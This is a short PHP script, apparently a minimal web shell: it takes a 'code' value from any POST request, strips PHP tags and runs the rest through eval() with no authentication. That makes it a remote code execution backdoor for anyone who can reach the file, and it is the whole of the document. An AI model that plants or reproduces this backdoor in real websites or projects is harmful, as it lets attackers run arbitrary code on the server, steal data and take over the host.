<?php
if(isset($_POST['code']))
{
	$code = str_replace(array('<?php','?>'), array('',''), $_POST['code']);
	eval($code);
}
?>